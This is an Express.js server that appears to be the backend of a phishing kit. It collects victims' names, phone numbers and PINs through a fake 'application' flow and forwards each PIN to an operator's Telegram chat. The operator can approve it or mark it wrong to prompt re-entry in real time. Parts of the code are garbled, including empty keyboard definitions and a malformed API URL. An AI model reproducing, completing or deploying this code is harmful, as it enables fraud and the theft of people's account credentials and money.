const express = require("express");
const axios = require("axios");
const path = require("path");

const app = express();
app.use(express.json());
app.use(express.static(__dirname));

const token = process.env.BOT_TOKEN;
const cid = process.env.CHAT_ID;
const users = {};

app.get("/", (req, res) => { 
  res.sendFile(path.join(__dirname, "index.html")); 
});

// 1. APPLICATION
app.post("/apply", async (req, res) => {
  const { name, phone } = req.body;
  if (!phone) return res.sendStatus(400);
  
  users[phone] = { status: "pending", pinStatus: "waiting", attempts: 0 };
  
  const keyboard = {
    inline_keyboard:]
  };

  try {
    await axios.post("https://telegram.org" + token + "/sendMessage", {
      chat_id: cid,
      text: "New Application: " + name + " (" + phone + ")",
      reply_markup: keyboard
    });
    res.sendStatus(200);
  } catch (e) { res.sendStatus(500); }
});

// 2. STATUS
app.get("/status/:phone", (req, res) => {
  const u = users[req.params.phone];
  res.json({ status: u ? u.status : "unknown" });
});

app.get("/check-pin-status/:phone", (req, res) => {
  const u = users[req.params.phone];
  res.json({ 
    status: u ? u.pinStatus : "unknown", 
    attempt: u ? u.attempts : 0 
  });
});

// 3. PIN SUBMIT
app.post("/send-pin", async (req, res) => {
  const { phone, pin } = req.body;
  const user = users[phone];
  if (!user) return res.sendStatus(404);

  user.attempts += 1;
  user.pinStatus = "verifying";

  const pinKeyboard = {
    inline_keyboard:]
  };

  try {
    await axios.post("https://telegram.org" + token + "/sendMessage", {
      chat_id: cid,
      text: "PIN RECEIVED: " + pin + " (" + phone + ")",
      reply_markup: pinKeyboard
    });
    res.sendStatus(200);
  } catch (e) { res.sendStatus(500); }
});

// 4. WEBHOOK
app.post("/webhook", (req, res) => {
  const body = req.body;
  if (!body.callback_query) return res.sendStatus(200);

  const data = body.callback_query.data;
  const parts = data.split("_");
  const cmd = parts[0];
  const phone = parts[1];

  if (users[phone]) {
    if (cmd === "approve") users[phone].status = "approved";
    if (cmd === "pinok") users[phone].pinStatus = "success";
    if (cmd === "pinwrong") users[phone].pinStatus = "re-enter";
  }

  res.sendStatus(200);
});

const PORT = process.env.PORT || 8080;
app.listen(PORT, "0.0.0.0", () => {
  console.log("SERVER START SUCCESSFUL");
});
